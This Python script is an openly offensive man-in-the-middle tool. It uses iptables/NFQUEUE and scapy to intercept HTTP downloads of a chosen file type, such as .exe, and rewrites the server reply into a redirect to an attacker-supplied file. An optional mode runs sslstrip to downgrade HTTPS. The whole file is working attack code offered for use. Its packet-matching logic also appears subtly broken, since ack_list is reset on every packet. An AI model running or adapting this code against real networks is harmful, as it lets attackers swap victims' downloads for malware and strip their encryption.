#!/usr/bin/env python

"""
Author: Matthew Zito (goldmund) 
Contact: https://www.github.com/MatthewZito
Version: 0.1.0

Presumes controller is MITM.
Allocates HTTP Txs into a queue, parses request and response objects.
Matches a given HTTP response-type (file download) and modifies the 
packet mid-tranist with a user-provided file. Packet req/res pair is
identified by cross-matching the seq/ack.
"""
import subprocess
import netfilterqueue
import scapy.all as scapy
import argparse


def elicit_arguments():
    """
    Fetches arguments ...
    """                                                                                                                                                                                                                                                                                                                         
    parser = argparse.ArgumentParser(description="Intercepts a given type of file download by surrogating said file with that provided by the user.")
    parser.add_argument("-f","--file", dest="redirect_url", help="full URL path for file redirect")
    parser.add_argument("-t","--type", dest="target_extension", help="type of file extension to target for surrogation (e.g. `--type .exe`)")
    parser.add_argument("-d","--downgrade", action="store_true", help="set to downgrade HTTPs")
    args = parser.parse_args() 
    if (not args.redirect_url):
        parser.error("[-] Redirect URL not specified. Use --help for usage instructions." )
    if (not args.target_extension):
        parser.error("[-] Target file type not specified. Use --help for usage instructions." )
    return args

def enable_port_fwd():
    """
    Enables port forwarding through controller machine.
    """
    print("[+] Enabling port forwarding.")
    ip_fwd_cmd = "echo 1 > /proc/sys/net/ipv4/ip_forward"
    # test_cmd = "echo 1 >> hello.txt"
    proc = subprocess.Popen(ip_fwd_cmd, shell=True, stdout=subprocess.PIPE)
    print(proc.communicate()[0]),

def generate_load(packet, load):
    """
    Surrogates target file with controller-provided file.
    Configures necessary fields to generate valid packet response,
    returns said modified response.
    """
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet): 
    """
    Determines how to process each packet in queue.
    Separates HTTP requests/responses and detects file downloads.
    Determines corresponding file req/res objects, enabling 
    packet interception and supplantation of the res load (file).
    """
    global redirect_url, target_extension, port
    ack_list = []
    redirect_header = "HTTP/1.1 301 Moved Permanently\nLocation: {i}\n\n".format(i=redirect_url)
    # wrap payload packet in Scapy IP layer
    scapy_packet_obj = scapy.IP(packet.get_payload())
    if (scapy_packet_obj.haslayer(scapy.Raw)):
        load = scapy_packet_obj[scapy.Raw].load
        # request obj
        if (scapy_packet_obj[scapy.TCP].dport == port):
            print(load)
            # ensure our url is not in load to prevent infinite loop
            if (target_extension in load and redirect_url not in load):
                print("[+] File Request")
                ack_list.append(scapy_packet_obj[scapy.TCP].ack)
        # response obj
        elif (scapy_packet_obj[scapy.TCP].sport == port): 
            if (scapy_packet_obj[scapy.TCP].seq in ack_list):
                ack_list.remove(scapy_packet_obj[scapy.TCP].seq)
                print("[+] Supplanting file(s)...")   
                generated_packet = generate_load(scapy_packet_obj, redirect_header)
                # distill into original packet obj 
                packet.set_payload(str(generated_packet))
    packet.accept()

def bind_queue():
    """
    Initiates a netfilterqueue object and binds to callback method
    so as to access the queue and act upon all packets therein.
    """
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

def instantiate_queue():
    """
    Enables queue by setting IP Tables rules to accomodate forwarding.
    """
    global downgrade
    print("[+] Instantiating queue...")
    fwd_cmd = "iptables -I FORWARD -j NFQUEUE --queue-num 0"
    downgrade_fwd_cmd = "iptables -I OUTPUT -j NFQUEUE --queue-num 0; iptables -I INPUT -j NFQUEUE --queue-num 0"
    downgrade_https = "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000"
    if (downgrade == True):
        enable_port_fwd()
        proc = subprocess.Popen("sslstrip", shell=True, stdout=subprocess.PIPE)
        print(proc.communicate()[0]),
        proc = subprocess.Popen(downgrade_fwd_cmd, shell=True, stdout=subprocess.PIPE)
        print(proc.communicate()[0]),
        proc = subprocess.Popen(downgrade_https, shell=True, stdout=subprocess.PIPE)
        print(proc.communicate()[0]),
    else:
        enable_port_fwd()
        proc = subprocess.Popen(fwd_cmd, shell=True, stdout=subprocess.PIPE)
        print(proc.communicate()[0]),
    bind_queue()



user_args = elicit_arguments() 
redirect_url = user_args.redirect_url
target_extension = user_args.target_extension
downgrade = user_args.downgrade
port = 10000 if (downgrade == True) else 80

def main():
    instantiate_queue()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[x] Program terminated by user. Flushing IP Tables...")
        subprocess.call(["iptables --flush"], shell=True)
        
# demo 
# http://iberianodonataucm.myspecies.info/sites/iberianodonataucm.myspecies.info/files/evolucion%20odonatos.PNG
# jpg
# visit: http://iberianodonataucm.myspecies.info/